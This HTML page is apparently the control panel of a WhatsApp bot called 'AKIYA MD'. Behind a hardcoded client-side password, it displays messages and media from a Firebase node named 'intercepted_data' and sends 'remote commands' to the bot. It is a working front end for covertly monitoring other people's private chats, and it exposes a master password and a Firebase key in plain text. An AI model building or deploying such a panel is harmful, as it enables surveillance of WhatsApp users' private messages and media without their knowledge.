<!DOCTYPE html>
<html>
<head>
    <title>AKIYA 龍 MD | SUPREME COMMAND</title>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
    <style>
        :root { --red: #ff0000; --bg: #000; }
        body { background: var(--bg); color: white; font-family: 'Courier New', monospace; margin: 0; }
        #login-screen { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        #main-panel { display: none; padding: 20px; }
        .vault-card { border: 1px solid var(--red); padding: 15px; margin: 10px; border-radius: 10px; background: rgba(20,0,0,0.8); box-shadow: 0 0 15px var(--red); }
        .media-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }
        input, button { background: #111; color: var(--red); border: 1px solid var(--red); padding: 10px; margin: 5px; }
        .secret-log { font-size: 12px; color: #0f0; overflow-y: scroll; height: 150px; background: #050505; padding: 10px; }
    </style>
</head>
<body>

<div id="login-screen">
    <h1 style="text-shadow: 0 0 10px red;">IDENTITY REQUIRED</h1>
    <input type="password" id="pass" placeholder="ENTER MASTER KEY">
    <button onclick="checkAuth()">ACCESS SYSTEM</button>
</div>

<div id="main-panel">
    <header style="border-bottom: 1px solid red; padding-bottom: 10px;">
        <h2>AKIYA 龍 MD | MONITORING HUB ✅</h2>
    </header>

    <div class="container">
        <div class="vault-card">
            <h3>👥 LIVE USER MONITOR (WA LOGS)</h3>
            <div id="user-logs" class="secret-log">Waiting for Data...</div>
        </div>

        <div class="vault-card">
            <h3>📥 MEDIA INTERCEPTOR (IMG/VID/VOICE)</h3>
            <div class="media-grid" id="media-vault">
                </div>
        </div>

        <div class="vault-card">
            <h3>🚀 REMOTE COMMAND INJECTOR</h3>
            <input type="text" id="cmd" placeholder="Enter Command (e.g. .restart)">
            <button onclick="sendCommand()">EXECUTE</button>
        </div>
    </div>
</div>

<script>
    const firebaseConfig = {
        apiKey: "aop4SIq1OjHZn_EW7",
        databaseURL: "https://akiya-dragon-v2-default-rtdb.asia-southeast1.firebasedatabase.app",
        projectId: "akiya-dragon-v2"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    function checkAuth() {
        const p = document.getElementById('pass').value;
        if(p === "akiya_master_99") { // මෙතන ඔයාගේ රහස් පාස්වර්ඩ් එක
            document.getElementById('login-screen').style.display = 'none';
            document.getElementById('main-panel').style.display = 'block';
            startMonitoring();
        } else { alert("ACCESS DENIED!"); }
    }

    function startMonitoring() {
        // Users ලාගෙ මැසේජ් සහ විස්තර ලෝඩ් කිරීම
        db.ref('intercepted_data').on('child_added', (snap) => {
            const data = snap.val();
            const log = document.getElementById('user-logs');
            log.innerHTML += `<div>[${data.time}] ${data.from}: ${data.msg}</div>`;
        });
    }

    function sendCommand() {
        const c = document.getElementById('cmd').value;
        db.ref('remote_commands').push({ cmd: c, status: 'pending' });
        alert("Command Sent to Dragon Core!");
    }
</script>
</body>
</html>
